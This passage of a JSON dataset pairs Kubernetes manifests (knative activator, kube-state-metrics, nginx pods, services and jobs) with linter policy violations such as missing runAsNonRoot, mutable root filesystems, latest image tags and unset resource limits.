    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: knative-serving-install\n    app.kubernetes.io/instance: knative-serving-install-v0.11.1\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: knative-serving-install\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: v0.11.1\n    kustomize.component: knative\n    serving.knative.dev/release: v0.11.1\n  name: activator\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      app: activator\n      app.kubernetes.io/component: knative-serving-install\n      app.kubernetes.io/instance: knative-serving-install-v0.11.1\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: knative-serving-install\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: v0.11.1\n      kustomize.component: knative\n      role: activator\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'true'\n      labels:\n        app: activator\n        app.kubernetes.io/component: knative-serving-install\n        app.kubernetes.io/instance: knative-serving-install-v0.11.1\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: knative-serving-install\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: v0.11.1\n        kustomize.component: knative\n        role: activator\n        serving.knative.dev/release: v0.11.1\n    spec:\n      containers:\n      - env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/internal/serving\n        image: gcr.io/knative-releases/knative.dev/serving/cmd/activator@sha256:8e606671215cc029683e8cd633ec5de9eabeaa6e9a4392ff289883304be1f418\n        livenessProbe:\n          httpGet:\n            httpHeaders:\n            - name: k-kubelet-probe\n              value: activator\n            path: /healthz\n            port: 8012\n        name: activator\n        ports:\n        - containerPort: 8012\n          name: http1\n        - containerPort: 8013\n          name: h2c\n        - containerPort: 9090\n          name: metrics\n        - containerPort: 8008\n          name: profiling\n        readinessProbe:\n          httpGet:\n            httpHeaders:\n            - name: k-kubelet-probe\n              value: activator\n            path: /healthz\n            port: 8012\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 600Mi\n          requests:\n            cpu: 300m\n            memory: 60Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      serviceAccountName: controller\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"controller\" not found"
  },
  {
    "id": "2393",
    "manifest_path": "data/manifests/the_stack_sample/sample_0611.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: knative-serving-install\n    app.kubernetes.io/instance: knative-serving-install-v0.11.1\n    app.kubernetes.io/managed-by: kfctl\n    app.kubernetes.io/name: knative-serving-install\n    app.kubernetes.io/part-of: kubeflow\n    app.kubernetes.io/version: v0.11.1\n    kustomize.component: knative\n    serving.knative.dev/release: v0.11.1\n  name: activator\n  namespace: knative-serving\nspec:\n  selector:\n    matchLabels:\n      app: activator\n      app.kubernetes.io/component: knative-serving-install\n      app.kubernetes.io/instance: knative-serving-install-v0.11.1\n      app.kubernetes.io/managed-by: kfctl\n      app.kubernetes.io/name: knative-serving-install\n      app.kubernetes.io/part-of: kubeflow\n      app.kubernetes.io/version: v0.11.1\n      kustomize.component: knative\n      role: activator\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'true'\n      labels:\n        app: activator\n        app.kubernetes.io/component: knative-serving-install\n        app.kubernetes.io/instance: knative-serving-install-v0.11.1\n        app.kubernetes.io/managed-by: kfctl\n        app.kubernetes.io/name: knative-serving-install\n        app.kubernetes.io/part-of: kubeflow\n        app.kubernetes.io/version: v0.11.1\n        kustomize.component: knative\n        role: activator\n        serving.knative.dev/release: v0.11.1\n    spec:\n      containers:\n      - env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_IP\n          valueFrom:\n            fieldRef:\n              fieldPath: status.podIP\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/internal/serving\n        image: gcr.io/knative-releases/knative.dev/serving/cmd/activator@sha256:8e606671215cc029683e8cd633ec5de9eabeaa6e9a4392ff289883304be1f418\n        livenessProbe:\n          httpGet:\n            httpHeaders:\n            - name: k-kubelet-probe\n              value: activator\n            path: /healthz\n            port: 8012\n        name: activator\n        ports:\n        - containerPort: 8012\n          name: http1\n        - containerPort: 8013\n          name: h2c\n        - containerPort: 9090\n          name: metrics\n        - containerPort: 8008\n          name: profiling\n        readinessProbe:\n          httpGet:\n            httpHeaders:\n            - name: k-kubelet-probe\n              value: activator\n            path: /healthz\n            port: 8012\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 600Mi\n          requests:\n            cpu: 300m\n            memory: 60Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n      serviceAccountName: controller\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"activator\" is not set to runAsNonRoot"
  },
  {
    "id": "2394",
    "manifest_path": "data/manifests/the_stack_sample/sample_0612.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: demojob2-workerpool\n  labels:\n    poolname: workerpool\nspec:\n  template:\n    metadata:\n      labels:\n        poolname: workerpool\n    spec:\n      containers:\n      - name: conbot\n        resources:\n          requests:\n            cpu: '6'\n        image: conbot/conbot:latest\n        imagePullPolicy: Always\n        args:\n        - convert\n        - -source\n        - gs://conbot-data/source/10m.csv.gz\n        - -target\n        - /output\n        - -consumer\n        - csv\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "2395",
    "manifest_path": "data/manifests/the_stack_sample/sample_0612.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: demojob2-workerpool\n  labels:\n    poolname: workerpool\nspec:\n  template:\n    metadata:\n      labels:\n        poolname: workerpool\n    spec:\n      containers:\n      - name: conbot\n        resources:\n          requests:\n            cpu: '6'\n        image: conbot/conbot:latest\n        imagePullPolicy: Always\n        args:\n        - convert\n        - -source\n        - gs://conbot-data/source/10m.csv.gz\n        - -target\n        - /output\n        - -consumer\n        - csv\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"conbot\" is using an invalid container image, \"conbot/conbot:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2396",
    "manifest_path": "data/manifests/the_stack_sample/sample_0612.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: demojob2-workerpool\n  labels:\n    poolname: workerpool\nspec:\n  template:\n    metadata:\n      labels:\n        poolname: workerpool\n    spec:\n      containers:\n      - name: conbot\n        resources:\n          requests:\n            cpu: '6'\n        image: conbot/conbot:latest\n        imagePullPolicy: Always\n        args:\n        - convert\n        - -source\n        - gs://conbot-data/source/10m.csv.gz\n        - -target\n        - /output\n        - -consumer\n        - csv\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"conbot\" does not have a read-only root file system"
  },
  {
    "id": "2397",
    "manifest_path": "data/manifests/the_stack_sample/sample_0612.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: demojob2-workerpool\n  labels:\n    poolname: workerpool\nspec:\n  template:\n    metadata:\n      labels:\n        poolname: workerpool\n    spec:\n      containers:\n      - name: conbot\n        resources:\n          requests:\n            cpu: '6'\n        image: conbot/conbot:latest\n        imagePullPolicy: Always\n        args:\n        - convert\n        - -source\n        - gs://conbot-data/source/10m.csv.gz\n        - -target\n        - /output\n        - -consumer\n        - csv\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"conbot\" is not set to runAsNonRoot"
  },
  {
    "id": "2398",
    "manifest_path": "data/manifests/the_stack_sample/sample_0612.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: demojob2-workerpool\n  labels:\n    poolname: workerpool\nspec:\n  template:\n    metadata:\n      labels:\n        poolname: workerpool\n    spec:\n      containers:\n      - name: conbot\n        resources:\n          requests:\n            cpu: '6'\n        image: conbot/conbot:latest\n        imagePullPolicy: Always\n        args:\n        - convert\n        - -source\n        - gs://conbot-data/source/10m.csv.gz\n        - -target\n        - /output\n        - -consumer\n        - csv\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"conbot\" has memory limit 0"
  },
  {
    "id": "2399",
    "manifest_path": "data/manifests/the_stack_sample/sample_0613.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: cueo-redis\n  name: cueo-redis\nspec:\n  ports:\n  - name: '6379'\n    port: 6379\n    targetPort: 6379\n  selector:\n    app: cueo-redis\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:cueo-redis])"
  },
  {
    "id": "2400",
    "manifest_path": "data/manifests/the_stack_sample/sample_0614.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 1.9.5\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 1.9.5\n    spec:\n      containers:\n      - image: quay.io/coreos/kube-state-metrics:v1.9.5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-state-metrics\" does not have a read-only root file system"
  },
  {
    "id": "2401",
    "manifest_path": "data/manifests/the_stack_sample/sample_0614.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 1.9.5\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 1.9.5\n    spec:\n      containers:\n      - image: quay.io/coreos/kube-state-metrics:v1.9.5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kube-state-metrics\" not found"
  },
  {
    "id": "2402",
    "manifest_path": "data/manifests/the_stack_sample/sample_0614.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 1.9.5\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 1.9.5\n    spec:\n      containers:\n      - image: quay.io/coreos/kube-state-metrics:v1.9.5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kube-state-metrics\" has cpu request 0"
  },
  {
    "id": "2403",
    "manifest_path": "data/manifests/the_stack_sample/sample_0614.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: kube-state-metrics\n    app.kubernetes.io/version: 1.9.5\n  name: kube-state-metrics\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: kube-state-metrics\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: kube-state-metrics\n        app.kubernetes.io/version: 1.9.5\n    spec:\n      containers:\n      - image: quay.io/coreos/kube-state-metrics:v1.9.5\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8080\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        name: kube-state-metrics\n        ports:\n        - containerPort: 8080\n          name: http-metrics\n        - containerPort: 8081\n          name: telemetry\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 5\n        securityContext:\n          runAsUser: 65534\n      serviceAccountName: kube-state-metrics\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-state-metrics\" has memory limit 0"
  },
  {
    "id": "2404",
    "manifest_path": "data/manifests/the_stack_sample/sample_0616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\nspec:\n  containers:\n  - name: pod2\n    image: ubuntu:16.04\n    args:\n    - sh\n    - -c\n    - sleep 10; true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"pod2\" does not have a read-only root file system"
  },
  {
    "id": "2405",
    "manifest_path": "data/manifests/the_stack_sample/sample_0616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\nspec:\n  containers:\n  - name: pod2\n    image: ubuntu:16.04\n    args:\n    - sh\n    - -c\n    - sleep 10; true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"pod2\" is not set to runAsNonRoot"
  },
  {
    "id": "2406",
    "manifest_path": "data/manifests/the_stack_sample/sample_0616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\nspec:\n  containers:\n  - name: pod2\n    image: ubuntu:16.04\n    args:\n    - sh\n    - -c\n    - sleep 10; true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"pod2\" has cpu request 0"
  },
  {
    "id": "2407",
    "manifest_path": "data/manifests/the_stack_sample/sample_0616.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\nspec:\n  containers:\n  - name: pod2\n    image: ubuntu:16.04\n    args:\n    - sh\n    - -c\n    - sleep 10; true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"pod2\" has memory limit 0"
  },
  {
    "id": "2408",
    "manifest_path": "data/manifests/the_stack_sample/sample_0618.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: ${artifactId}\n  namespace: ${kube-namespace}\nspec:\n  selector:\n    app: ${artifactId}\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "service has invalid label selector: values[0][app]: Invalid value: \"${artifactId}\": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
  },
  {
    "id": "2409",
    "manifest_path": "data/manifests/the_stack_sample/sample_0621.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: hello\n  name: hello\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: hello\n  template:\n    metadata:\n      labels:\n        run: hello\n    spec:\n      containers:\n      - image: k8s.gcr.io/echoserver:1.9\n        name: hello\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hello\" does not have a read-only root file system"
  },
  {
    "id": "2410",
    "manifest_path": "data/manifests/the_stack_sample/sample_0621.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: hello\n  name: hello\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: hello\n  template:\n    metadata:\n      labels:\n        run: hello\n    spec:\n      containers:\n      - image: k8s.gcr.io/echoserver:1.9\n        name: hello\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hello\" is not set to runAsNonRoot"
  },
  {
    "id": "2411",
    "manifest_path": "data/manifests/the_stack_sample/sample_0621.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: hello\n  name: hello\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: hello\n  template:\n    metadata:\n      labels:\n        run: hello\n    spec:\n      containers:\n      - image: k8s.gcr.io/echoserver:1.9\n        name: hello\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hello\" has cpu request 0"
  },
  {
    "id": "2412",
    "manifest_path": "data/manifests/the_stack_sample/sample_0621.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    run: hello\n  name: hello\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      run: hello\n  template:\n    metadata:\n      labels:\n        run: hello\n    spec:\n      containers:\n      - image: k8s.gcr.io/echoserver:1.9\n        name: hello\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hello\" has memory limit 0"
  },
  {
    "id": "2413",
    "manifest_path": "data/manifests/the_stack_sample/sample_0623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubeecho-folder\n  labels:\n    app: kubeecho-folder\nspec:\n  selector:\n    matchLabels:\n      app: kubeecho-folder\n  template:\n    metadata:\n      labels:\n        app: kubeecho-folder\n    spec:\n      containers:\n      - name: kubeecho-folder\n        image: emrahkk/kube-echo:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n          name: http\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3000\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 3000\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"kubeecho-folder\" is using an invalid container image, \"emrahkk/kube-echo:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2414",
    "manifest_path": "data/manifests/the_stack_sample/sample_0623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubeecho-folder\n  labels:\n    app: kubeecho-folder\nspec:\n  selector:\n    matchLabels:\n      app: kubeecho-folder\n  template:\n    metadata:\n      labels:\n        app: kubeecho-folder\n    spec:\n      containers:\n      - name: kubeecho-folder\n        image: emrahkk/kube-echo:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n          name: http\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3000\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 3000\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kubeecho-folder\" does not have a read-only root file system"
  },
  {
    "id": "2415",
    "manifest_path": "data/manifests/the_stack_sample/sample_0623.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kubeecho-folder\n  labels:\n    app: kubeecho-folder\nspec:\n  selector:\n    matchLabels:\n      app: kubeecho-folder\n  template:\n    metadata:\n      labels:\n        app: kubeecho-folder\n    spec:\n      containers:\n      - name: kubeecho-folder\n        image: emrahkk/kube-echo:latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 3000\n          name: http\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 3000\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 3000\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 10m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kubeecho-folder\" is not set to runAsNonRoot"
  },
  {
    "id": "2416",
    "manifest_path": "data/manifests/the_stack_sample/sample_0624.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: flipstarter\n  namespace: default\nspec:\n  ports:\n  - port: 300\n    targetPort: 3000\n  selector:\n    service: flipstarter\n  type: NodePort\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[service:flipstarter])"
  },
  {
    "id": "2417",
    "manifest_path": "data/manifests/the_stack_sample/sample_0625.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: kube-dns\n  namespace: kube-system\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/cluster-service: 'true'\n    kubernetes.io/name: KubeDNS\nspec:\n  selector:\n    k8s-app: kube-dns\n  ports:\n  - name: dns\n    port: 53\n    protocol: UDP\n  - name: dns-tcp\n    port: 53\n    protocol: TCP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[k8s-app:kube-dns])"
  },
  {
    "id": "2418",
    "manifest_path": "data/manifests/the_stack_sample/sample_0626.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vpa-recommender\n  namespace: kube-system\n  labels:\n    application: vpa-recommender\n    version: patched-0.5.1-master-16\n    component: vpa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: vpa-recommender\n  template:\n    metadata:\n      labels:\n        application: vpa-recommender\n        version: patched-0.5.1-master-16\n        component: vpa\n    spec:\n      serviceAccountName: system\n      containers:\n      - name: recommender\n        image: registry.opensource.zalan.do/teapot/vpa-recommender:patched-0.5.1-master-16\n        args:\n        - --stderrthreshold=info\n        - --v=5\n        - --memory-saver\n        - --pod-recommendation-min-memory-mb=50\n        command:\n        - /recommender\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 200m\n            memory: 500Mi\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"recommender\" does not have a read-only root file system"
  },
  {
    "id": "2419",
    "manifest_path": "data/manifests/the_stack_sample/sample_0626.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vpa-recommender\n  namespace: kube-system\n  labels:\n    application: vpa-recommender\n    version: patched-0.5.1-master-16\n    component: vpa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: vpa-recommender\n  template:\n    metadata:\n      labels:\n        application: vpa-recommender\n        version: patched-0.5.1-master-16\n        component: vpa\n    spec:\n      serviceAccountName: system\n      containers:\n      - name: recommender\n        image: registry.opensource.zalan.do/teapot/vpa-recommender:patched-0.5.1-master-16\n        args:\n        - --stderrthreshold=info\n        - --v=5\n        - --memory-saver\n        - --pod-recommendation-min-memory-mb=50\n        command:\n        - /recommender\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 200m\n            memory: 500Mi\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"system\" not found"
  },
  {
    "id": "2420",
    "manifest_path": "data/manifests/the_stack_sample/sample_0626.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: vpa-recommender\n  namespace: kube-system\n  labels:\n    application: vpa-recommender\n    version: patched-0.5.1-master-16\n    component: vpa\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      application: vpa-recommender\n  template:\n    metadata:\n      labels:\n        application: vpa-recommender\n        version: patched-0.5.1-master-16\n        component: vpa\n    spec:\n      serviceAccountName: system\n      containers:\n      - name: recommender\n        image: registry.opensource.zalan.do/teapot/vpa-recommender:patched-0.5.1-master-16\n        args:\n        - --stderrthreshold=info\n        - --v=5\n        - --memory-saver\n        - --pod-recommendation-min-memory-mb=50\n        command:\n        - /recommender\n        resources:\n          limits:\n            cpu: 200m\n            memory: 500Mi\n          requests:\n            cpu: 200m\n            memory: 500Mi\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"recommender\" is not set to runAsNonRoot"
  },
  {
    "id": "2421",
    "manifest_path": "data/manifests/the_stack_sample/sample_0630.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: devopsgirls-pod\n  labels:\n    name: devopsgirls-pod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2422",
    "manifest_path": "data/manifests/the_stack_sample/sample_0630.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: devopsgirls-pod\n  labels:\n    name: devopsgirls-pod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2423",
    "manifest_path": "data/manifests/the_stack_sample/sample_0630.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: devopsgirls-pod\n  labels:\n    name: devopsgirls-pod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2424",
    "manifest_path": "data/manifests/the_stack_sample/sample_0630.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: devopsgirls-pod\n  labels:\n    name: devopsgirls-pod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2425",
    "manifest_path": "data/manifests/the_stack_sample/sample_0630.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: devopsgirls-pod\n  labels:\n    name: devopsgirls-pod\nspec:\n  containers:\n  - image: nginx:latest\n    name: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2426",
    "manifest_path": "data/manifests/the_stack_sample/sample_0631.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: balanceload\nspec:\n  selector:\n    app: nginx\n  ports:\n  - port: 80\n    targetPort: 80\n    protocol: TCP\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:nginx])"
  },
  {
    "id": "2427",
    "manifest_path": "data/manifests/the_stack_sample/sample_0632.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: files-app\n  labels:\n    app: files\n    tier: frontend\n  annotations:\n    external-dns.alpha.kubernetes.io/hostname: files-app.workshops.mikebild.com.\nspec:\n  selector:\n    app: files\n    tier: frontend\n  type: LoadBalancer\n  ports:\n  - port: 80\n    targetPort: 8080\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:files tier:frontend])"
  },
  {
    "id": "2428",
    "manifest_path": "data/manifests/the_stack_sample/sample_0633.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-demo\nspec:\n  containers:\n  - name: default-demo-ctr\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"default-demo-ctr\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2429",
    "manifest_path": "data/manifests/the_stack_sample/sample_0633.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: default-demo\nspec:\n  containers:\n  - name: default-demo-ctr\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"default-demo-ctr\" does not have a read-only root file system"
